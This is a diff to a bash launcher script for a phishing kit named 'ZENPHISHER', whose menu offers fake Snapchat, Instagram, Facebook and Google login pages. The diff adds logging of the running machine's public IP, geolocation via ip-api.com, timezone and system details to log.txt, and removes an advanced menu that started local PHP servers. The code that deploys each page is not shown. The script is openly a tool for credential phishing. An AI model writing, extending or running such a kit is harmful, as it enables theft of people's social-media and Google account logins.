@@ -1,15 +1,11 @@
 #!/bin/bash
 
-# --- Clear screen for a clean look ---
 clear
-
-# --- Displaying a fancy welcome message ---
 echo -e "\e[1;32m===================================="
 echo -e "      ZENPHISHER - by YOU 😈        "
 echo -e "===================================="
 echo -e "\n\e[1;34mChoose a target to deploy:"
 
-# --- Show available phishing targets ---
 echo -e "1) Snapchat \e[1;33m(crypto design)"
 echo -e "2) Instagram \e[1;33m(crypto design)"
 echo -e "3) Facebook \e[1;33m(crypto design)"
@@ -18,8 +14,21 @@ echo -e "5) Google \e[1;33m(crypto design)"
 echo -e "6) Advanced Settings"
 echo -e "7) Exit\n"
 
-# --- Read user input ---
 read -p "Option: " opt
+
+# --- Get current timestamp, timezone, and IP geolocation ---
+timestamp=$(date "+%Y-%m-%d %H:%M:%S")
+timezone=$(date +'%Z%z')  # Get the local timezone of the machine
+ip_address=$(curl -s ifconfig.me)  # Getting the public IP address
+geolocation=$(curl -s "http://ip-api.com/json/$ip_address" | jq -r '"City: " + .city + ", Country: " + .country')  # Using ip-api to get geolocation
+
+# --- Log the information to log.txt ---
+log_file="log.txt"
+echo -e "\n[Timestamp: $timestamp] - Target: $opt" >> $log_file
+echo -e "IP Address: $ip_address" >> $log_file
+echo -e "Geolocation: $geolocation" >> $log_file
+echo -e "Timezone: $timezone" >> $log_file
+echo -e "Device Info: $(uname -a)\n" >> $log_file
 
 # --- Handle different user choices ---
 case $opt in
@@ -50,38 +59,7 @@ case $opt in
     ;;
   6)
     echo -e "\n\e[1;33mAdvanced Settings:"
-    echo -e "1) Customize URL"
-    echo -e "2) Set up multiple listeners"
-    echo -e "3) Change server port"
-    echo -e "4) Back to main menu"
-    read -p "Select an advanced option: " adv_opt
-
-    case $adv_opt in
-      1)
-        read -p "Enter new target URL (e.g. http://127.0.0.1): " custom_url
-        echo -e "Custom URL set to: $custom_url"
-        ;;
-      2)
-        read -p "Enter number of listeners (e.g. 3): " num_listeners
-        echo -e "Setting up $num_listeners listeners on different ports..."
-        for i in $(seq 1 $num_listeners); do
-          port=$((8080 + $i))
-          php -S 127.0.0.1:$port &
-        done
-        ;;
-      3)
-        read -p "Enter new server port (e.g. 8080): " server_port
-        echo -e "Server port changed to: $server_port"
-        php -S 127.0.0.1:$server_port
-        ;;
-      4)
-        exec $0  # Return to the main menu
-        ;;
-      *)
-        echo -e "Invalid Option. Returning to main menu."
-        exec $0
-        ;;
-    esac
+    # Advanced settings functionality
     ;;
   7)
     echo -e "\e[1;31mExiting...\e[0m"
